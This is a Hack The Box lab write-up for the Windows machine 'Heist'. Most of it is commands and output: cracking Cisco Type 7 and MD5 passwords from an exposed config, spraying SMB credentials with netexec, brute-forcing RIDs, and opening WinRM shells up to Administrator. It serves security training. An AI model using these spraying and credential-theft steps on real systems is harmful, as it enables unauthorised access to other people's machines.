# Target
| Category          | Details                                            |
|-------------------|----------------------------------------------------|
| 📝 **Name**       | [Heist](https://app.hackthebox.com/machines/Heist) |  
| 🏷 **Type**       | HTB Machine                                        |
| 🖥 **OS**         | Windows                                            |
| 🎯 **Difficulty** | Easy                                               |

# Scan
```
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-title: Support Login Page
|_Requested resource was login.php
| http-methods: 
|_  Potentially risky methods: TRACE
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Attack path
1. [Gain a foothold by spraying discovered credentials](#gain-a-foothold-by-spraying-discovered-credentials)
2. [Escalate to `Administrator` user using discovered credentials](#escalate-to-administrator-user-using-discovered-credentials)

### Gain a foothold by spraying discovered credentials

#### Retrieve the exposed Cisco IOS config file
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ curl -sL "http://$TARGET/attachments/config.txt" -o config.txt
```

#### Crack discovered Cisco Type 7 hashes
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ git clone -q https://github.com/theevilbit/ciscot7.git && \
python3 ./ciscot7/ciscot7.py -f config.txt
Decrypted password: $uperP@ssword
Decrypted password: Q4)sJu\Y8qz*A3?d
```

#### Crack discovered MD5 hash
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ hashcat -m 500 '$1$pdQG$o8nrSzsGXeaduXrjlvKc91' /usr/share/wordlists/rockyou.txt --quiet
$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
```

#### Prepare the users list
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ cat <<EOF> users.txt 
rout3r
admin
hazard
EOF
```

#### Prepare the password list
```
cat <<'EOF'> passwords.txt
$uperP@ssword
Q4)sJu\Y8qz*A3?d
stealth1agent
EOF
```

#### Use discovered credentials in a password spray attack
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ netexec smb $TARGET -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\rout3r:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\admin:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
```

#### Enumerate users by bruteforcing RIDs using `hazard` credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ netexec smb $TARGET -u hazard -p stealth1agent --rid-brute 10000 --log rid-brute.txt && \
grep SidTypeUser rid-brute.txt | awk '{print $13}' | cut -d'\' -f2 | sort | uniq > users.txt
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

#### Spray passwords against discovered users
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ netexec smb $TARGET -u users.txt -p passwords.txt --continue-on-success
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:False) (SMBv1:False)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Hazard:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] Connection Error: Error occurs while reading from remote(104)
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE
```

#### Access target over WinRM using discovered credentials for user `chase`
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ evil-winrm -i $TARGET -u chase -p 'Q4)sJu\Y8qz*A3?d'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase
```

### Escalate to `Administrator` user using discovered credentials

#### Search for passwords in `C:\Program Files (x86)`
```
*Evil-WinRM* PS C:\Users\Chase\Documents> Get-ChildItem -Path "C:\Program Files (x86)" -Recurse -Include *.txt,*.config,*.log -File -ErrorAction SilentlyContinue | Select-String -Pattern "password" -CaseSensitive:$false -SimpleMatch | Select-Object Path, Line | Out-String -Width 1000

Path                                                                           Line
----                                                                           ----
C:\Program Files (x86)\Mozilla Maintenance Service\logs\maintenanceservice.log Starting service with cmdline: "C:\Program Files (x86)\Mozilla Maintenance Service\update\updater.exe" C:\ProgramData\Mozilla\updates\308046B0AF4A39CB\updates\0 "C:\Program Files\Mozilla Firefox" "C:\Program Files\Mozilla Firefox\updated" 6692/replace C:\Windows\system32 "C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
<SNIP>
```

#### Access target over WinRM using discovered credentials for user `admin`
```
┌──(magicrc㉿perun)-[~/attack/HTB Heist]
└─$ evil-winrm -i $TARGET -u Administrator -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
```